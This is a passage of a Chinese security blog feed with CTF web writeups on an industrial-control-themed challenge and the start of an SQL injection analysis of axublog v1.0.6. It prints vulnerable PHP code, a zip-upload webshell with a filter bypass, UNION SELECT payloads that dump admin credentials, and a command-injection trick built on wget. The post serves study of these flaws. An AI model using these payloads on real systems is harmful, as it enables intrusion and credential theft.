file size too big!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</div><div class="line">            move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</div><div class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">          &#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</div><div class="line">            move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</div><div class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">          &#125;</div><div class="line">         &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'step'</span>]) &amp;&amp; strlen($_GET[<span class="string">'step'</span>]) === <span class="number">20</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'lag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">' '</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'/'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span> (preg_match(<span class="string">'/[^\w\d_ -]/si'</span>, $_GET[<span class="string">'step'</span>])) &#123;</div><div class="line">        $_GET[<span class="string">'step'</span>] = preg_replace(<span class="string">'/[^a-zA-Z0-9_ -]/s'</span>, <span class="string">''</span>, $_GET[<span class="string">'step'</span>]);</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line">        passthru(<span class="string">'cat '</span> . <span class="string">'uploaded/'</span> . $_GET[<span class="string">'step'</span>]);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来审计upload.php，可以看到允许上传zip文件，里面有这么一段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</div><div class="line">  move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</div><div class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">&#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</div><div class="line">  move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</div><div class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>调用了unzip.sh，访问<a href="http://47.104.188.226:20001/includes/unzip.sh" target="_blank" rel="external">http://47.104.188.226:20001/includes/unzip.sh</a> ,得到代码：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/bin/bash</span></div><div class="line"><span class="built_in">cd</span> ./uploaded</div><div class="line">find ./ -size +1M | xargs rm</div><div class="line"><span class="built_in">cd</span> ../</div><div class="line">unzip -o ./uploaded/*.zip <span class="_">-d</span> ./uploaded/</div><div class="line">rm -rf ./uploaded/*.zip</div><div class="line">rm -rf ./uploaded/*.*</div><div class="line">rm -rf ./uploaded/.*</div><div class="line"><span class="built_in">cd</span> ./uploaded</div><div class="line">find -type d | xargs rm -rf</div><div class="line">touch /var/www/html/includes/uploaded/index.php</div><div class="line">chmod 000 /var/www/html/includes/uploaded/index.php</div></pre></td></tr></table></figure></p>
<p>sh脚本会将zip包解压缩到当前目录的uploaded目录下，接着删除符合规则的三种文件和目录。最后创建index.php，并设置权限位。</p>
<p>综上，我们构造一个压缩包，使之解压后不被删除，同时结合index.php的page参数的文件包含功能，即可获得shell。</p>
<p>文件chybeta内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">system(&apos;cat flag/flag/flag/flag/flag/flag/flag.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>压缩后为c.zip，在上传时抓包，将type改为application/zip。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/6.jpg?raw=true" alt=""></p>
<p>上传成功后，会执行unzip.sh，即可解压出压缩包的内容，比如访问<a href="http://47.104.188.226:20001/includes/uploaded/chybeta" target="_blank" rel="external">http://47.104.188.226:20001/includes/uploaded/chybeta</a></p>
<p>接着考虑如何包含uploaded目录下的chybeta文件。在index.php中，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;uploaded&apos;) &gt; 0) &#123;</div><div class="line">  die(&apos;no uploaded uploaded uploaded uploaded !&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于这里是用<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，并且用stripos来定位，所以当我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/chybeta</div></pre></td></tr></table></figure></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>即为<code>uploaded&amp;page=uploaded/chybeta</code>，strpos的值为0，从而绕过了检测。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/7.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;CVE_SomeThing_aBout_gitLab&#125;</div></pre></td></tr></table></figure></p>
<h1 id="YUNWAF的突破-青云"><a href="#YUNWAF的突破-青云" class="headerlink" title="YUNWAF的突破_青云"></a>YUN<em>WAF</em>的突破_青云</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://qcloudcetc.xctf.org.cn:8099</div><div class="line">`</div><div class="line">## Solution</div><div class="line">当用户名过长时，即可绕过waf，这里a的个数为886个：</div></pre></td></tr></table></figure>
<p>username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#</p>
<p>result:<br>information_schema cetCCHqy004 mysql performance_schema<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/8.jpg?raw=true)</div><div class="line"></div><div class="line">最后payload：</div></pre></td></tr></table></figure></p>
<p>username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(username,password,question,answer+SEPARATOR+0x3c62723e)+FROM+cetCCHqy004.admin)),32#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/10.jpg?raw=true)</div><div class="line"></div><div class="line"># 请关注工控云管理系统的警告记录</div><div class="line">## 题目</div></pre></td></tr></table></figure></p>
<p>参与工控云管理系统警告记录的活动，可能奖励你一个flag<br><a href="http://47.104.166.183:20008" target="_blank" rel="external">http://47.104.166.183:20008</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## Solution</div><div class="line">题目给了源码，在 http://47.104.166.183:20008/getflag.php</div><div class="line">```php</div><div class="line">&lt;?php</div><div class="line">   if(!isset($_GET[&apos;c&apos;]) &amp;&amp; !isset($_GET[&apos;re&apos;])) &#123;</div><div class="line">	   show_source(__FILE__);</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   $selfdir = $_GET[&apos;dir&apos;];</div><div class="line">   if (!isset($selfdir)) &#123;</div><div class="line">	 die();</div><div class="line">   &#125;</div><div class="line">   $secret = &apos;/var/www/html/hackme/&apos; . md5(&quot;cetcrce&quot; . $selfdir . $_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">   @chdir(&apos;hackme&apos;);</div><div class="line">   @mkdir($secret);</div><div class="line">   @chdir($secret);</div><div class="line"></div><div class="line">   if (isset($_GET[&apos;c&apos;]) &amp;&amp; strlen($_GET[&apos;c&apos;]) &lt;= 5) &#123;</div><div class="line">	   include(&apos;waf.php&apos;);</div><div class="line">	   @exec($_GET[&apos;c&apos;]);</div><div class="line">   &#125;elseif(isset($_GET[&apos;re&apos;])) &#123;</div><div class="line">	   @exec(&apos;/bin/rm -rf &apos; . $secret);</div><div class="line">	   @exec(&apos;touch /var/www/html/hackme/index.php&apos;);</div><div class="line">   &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>相比于hitcon17的babyfirst，多了个waf.php，但不知道它的具体内容。<br>参考 <a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup </a></p>
<p>用wget获取文件index.html，执行<code>sh i*</code>即可执行<code>sh index.html</code>：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/11.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;J0w_ab0ut_c0mmAnd_3xcu&#125;</div></pre></td></tr></table></figure></p>
<h1 id="工控云管理系统项目管理页面解析漏洞"><a href="#工控云管理系统项目管理页面解析漏洞" class="headerlink" title="工控云管理系统项目管理页面解析漏洞"></a>工控云管理系统项目管理页面解析漏洞</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这个工控云管理系统的解析漏洞要靠管理员去修补。</div><div class="line">http://47.104.156.32:20007</div></pre></td></tr></table></figure>
<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>点进去后，点击项目管理，发现url为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.156.32:20007/index.php?page=flag.php</div></pre></td></tr></table></figure></p>
<p>同时有一个view-source按钮，给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</div><div class="line">   $con = $_POST[<span class="string">'con'</span>];</div><div class="line">   $file = $_POST[<span class="string">'file'</span>];</div><div class="line">   $filename = <span class="string">"backup/"</span>.$file;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">        chdir(<span class="string">'uploaded'</span>);</div><div class="line">       $f = fopen($filename, <span class="string">'w'</span>);</div><div class="line">       fwrite($f, $con);</div><div class="line">       fclose($f);</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">'config.php'</span>;</div><div class="line">    $id = mysql_real_escape_string($_GET[id]);</div><div class="line">    $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    $result = mysql_fetch_object($result);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    $result = <span class="keyword">False</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</div><div class="line">  <span class="keyword">if</span>($result)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</div><div class="line">  &#125;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</div><div class="line">   $con = $_POST[<span class="string">'con'</span>];</div><div class="line">   $file = $_POST[<span class="string">'file'</span>];</div><div class="line">   $filename = <span class="string">"backup/"</span>.$file;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">        chdir(<span class="string">'uploaded'</span>);</div><div class="line">       $f = fopen($filename, <span class="string">'w'</span>);</div><div class="line">       fwrite($f, $con);</div><div class="line">       fclose($f);</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>参考 <a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=626</a></p>
<h1 id="云工控管理系统文档中心的秘密"><a href="#云工控管理系统文档中心的秘密" class="headerlink" title="云工控管理系统文档中心的秘密"></a>云工控管理系统文档中心的秘密</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云工控管理系统的文档中心页面，存在不易被发现的漏洞。</div><div class="line">http://47.104.73.107:20002/</div></pre></td></tr></table></figure>
<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><h1 id="YUNWAF的突破-华为云"><a href="#YUNWAF的突破-华为云" class="headerlink" title="YUNWAF的突破_华为云"></a>YUN<em>WAF</em>的突破_华为云</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://huaweicetc.xctf.org.cn</div></pre></td></tr></table></figure>
<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><h1 id="YUNWAF的突破-阿里"><a href="#YUNWAF的突破-阿里" class="headerlink" title="YUNWAF的突破_阿里"></a>YUN<em>WAF</em>的突破_阿里</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://alicetc.xctf.org.cn</div></pre></td></tr></table></figure>
<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为什么比赛要办在考试周。。&lt;br&gt;一些题是比赛完后做的，暂时只写了部分题的wp。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>axublog v1.0.6 两处sql注入分析</title>
    <link href="http://chybeta.github.io/2017/12/26/axublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/12/26/axublog-v1-0-6-两处sql注入分析/</id>
    <published>2017-12-26T08:23:22.000Z</published>
    <updated>2017-12-26T09:30:54.398Z</updated>
    
    <content type="html"><![CDATA[<p>继续水一水，把以前随手看的发上来。</p>
<a id="more"></a>
<h1 id="axublog"><a href="#axublog" class="headerlink" title="axublog"></a>axublog</h1><p>下载地址：<a href="http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80" target="_blank" rel="external">http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80</a></p>
<h1 id="sql注入一：hit-php"><a href="#sql注入一：hit-php" class="headerlink" title="sql注入一：hit.php"></a>sql注入一：hit.php</h1><p>hit.php的代码量较小，这里直接贴出来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">"cmsconfig.php"</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">"class/c_other.php"</span>);</div><div class="line">sqlguolv();</div><div class="line"></div><div class="line">$g=$_GET[<span class="string">'g'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($g==<span class="string">'arthit'</span>)&#123;</div><div class="line">	$id=$_GET[<span class="string">'id'</span>];</div><div class="line">	<span class="keyword">if</span>($id!=<span class="string">''</span>)&#123;   </div><div class="line">		$tab=$tabhead.<span class="string">"arts"</span>;</div><div class="line">		mysql_select_db($tab);</div><div class="line">		$sql=mysql_query(<span class="string">"UPDATE "</span>.$tab.<span class="string">" SET hit=hit+1 where id="</span>.$id);</div><div class="line">		$sql = mysql_query(<span class="string">"select * from "</span>.$tab.<span class="string">" where id="</span>.$id);</div><div class="line">		$row=mysql_fetch_array($sql);</div><div class="line">	    $str=$row[<span class="string">'hit'</span>];</div><div class="line">	    <span class="keyword">echo</span> <span class="string">'document.write('</span>.$str.<span class="string">');'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>其中sqlguolv()函数定义在 <code>class\c_other.php</code>的第545行左右：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Function sqlguolv() &#123;</div><div class="line">		@header(&quot;Content-type:text/html; charset=utf-8&quot;);</div><div class="line">if (preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,$_SERVER[&apos;QUERY_STRING&apos;])==1 or preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,file_get_contents(&quot;php://input&quot;))==1)&#123;echo &quot;警告 非法访问！&quot;;    exit;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>不过由于程序没有考虑到编码的问题，因此可以对某些关键字进行url编码进行绕过。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/1.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/2.jpg?raw=true" alt=""></p>
<p>结合表的结构，可以构造出以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/axublog/axublog1.0.6install/hit.php?g=arthit&amp;id=0+uni%6fn+s%65l%65ct+1,1,1,1,1,1,group_concat(id,0x3c62723e,adnaa,0x3c62723e,adpss,0x3c62723e),1,1,1,1,1+fro%6d+axublog_adusers</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/3.jpg?raw=true" alt=""></p>
<h1 id="sql注入二：ad-login-php"><a href="#sql注入二：ad-login-php" class="headerlink" title="sql注入二：ad/login.php"></a>sql注入二：ad/login.php</h1><p>填写用户名和密码后，点击提交，会访问<code>login.php?g=jsloginpost</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">..</div><div class="line">@$user=$_POST[<span class="string">"user"</span>];</div><div class="line">@$psw=$_POST[<span class="string">"psw"</span>];</div><div class="line">@$loginlong=$_POST[<span class="string">"loginlong"</span>];</div><div class="line"></div><div class="line">@$g=$_GET[<span class="string">"g"</span>];</div><div class="line">    <span class="keyword">switch</span> ($g)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">"jsloginpost"</span>:jsloginpost();<span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">"exit"</span>:loginexit();<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:index();<span class="keyword">break</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
